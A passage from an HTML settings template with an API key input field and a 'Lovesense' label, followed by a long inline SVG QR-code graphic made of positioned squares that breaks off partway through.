    <input type="text" id="proxyCheckApiKey" class="mt-1 block w-full bg-white/50 dark:bg-black/50" value="${state.config?.options?.api_keys?.proxycheck || ''}">
</div>
      <div>
        <label class="block text-sm font-medium text-text-light dark:text-text-color">Lovesense</label>
         <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"width="200px" viewBox="0 0 1160 1160" enable-background="new 0 0 1160 1160" xml:space="preserve"><rect x="0" y="0" width="1160" height="1160" fill="rgb(255,255,255)" /><g transform="translate(80,80)"><g transform="translate(320,0) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(360,0) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(440,0) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(560,0) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(640,0) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(320,40) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(360,40) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(400,40) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(440,40) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(640,40) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(320,80) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(360,80) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(440,80) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(520,80) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(600,80) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(400,120) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(520,120) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(640,120) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(320,160) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(400,160) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(440,160) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(560,160) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(640,160) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(360,200) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(440,200) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(520,200) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(320,240) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(400,240) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(480,240) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(560,240) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(640,240) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(360,280) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(400,280) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(440,280) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(480,280) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(520,280) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(600,280) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(0,320) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(120,320) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(160,320) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(200,320) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(240,320) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(280,320) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(320,320) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(400,320) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(560,320) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(600,320) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(680,320) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(800,320) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(880,320) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(920,320) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(960,320) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(80,360) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(120,360) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(280,360) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(320,360) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(360,360) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(440,360) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(520,360) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(560,360) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(600,360) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(760,360) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(800,360) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(840,360) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(880,360) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(920,360) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(120,400) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(160,400) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(200,400) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(240,400) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(280,400) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(320,400) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(400,400) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(520,400) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(600,400) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(800,400) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(840,400) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(960,400) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(0,440) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(80,440) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(120,440) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(200,440) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(400,440) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(560,440) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(600,440) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(760,440) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(800,440) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(840,440) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(880,440) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(920,440) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(960,440) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(0,480) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(80,480) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(120,480) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(200,480) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(240,480) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(320,480) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(360,480) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(400,480) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(640,480) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(720,480) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(760,480) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(960,480) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(0,520) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(120,520) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(160,520) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(200,520) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(320,520) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(360,520) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(400,520) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(480,520) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(560,520) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(600,520) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(640,520) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(680,520) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(800,520) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(920,520) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(0,560) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(40,560) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(80,560) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(120,560) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(240,560) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(280,560) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(400,560) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(520,560) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(560,560) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(600,560) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(680,560) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(720,560) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(800,560) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(840,560) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(880,560) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(920,560) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(960,560) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(0,600) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(280,600) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(360,600) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(480,600) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(760,600) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(840,600) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(880,600) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(960,600) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(0,640) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(80,640) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(160,640) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(200,640) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(240,640) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(280,640) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(320,640) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(360,640) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(440,640) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(480,640) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(520,640) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(560,640) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(600,640) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(640,640) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(680,640) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(720,640) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(760,640) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(800,640) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(880,640) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(920,640) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(320,680) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(360,680) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(400,680) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(440,680) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(520,680) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(640,680) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(800,680) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(880,680) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(920,680) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(320,720) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(480,720) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(640,720) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(720,720) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(800,720) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(960,720) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(320,760) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(400,760) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(440,760) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(520,760) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(600,760) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(640,760) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(800,760) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(320,800) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(440,800) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(520,800) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(600,800) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(640,800) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(680,800) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(720,800) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(760,800) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(800,800) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(920,800) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(960,800) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(320,840) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(360,840) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(400,840) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(480,840) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(520,840) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(560,840) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(600,840) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(680,840) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(720,840) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(920,840) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(960,840) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(360,880) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(400,880) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(440,880) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(520,880) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(600,880) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(680,880) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(800,880) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(840,880) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(880,880) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(920,880) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(960,880) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(360,920) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(400,920) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(440,920) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(480,920) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(520,920) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(600,920) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(720,920) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(760,920) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(800,920) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(880,920) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(920,920) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(960,920) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect width="100" height="100"/></g></g><g transform="translate(320,960) scale(0.4,0.4)"><g transform="" style="fill: rgb(0, 0, 0);"><rect 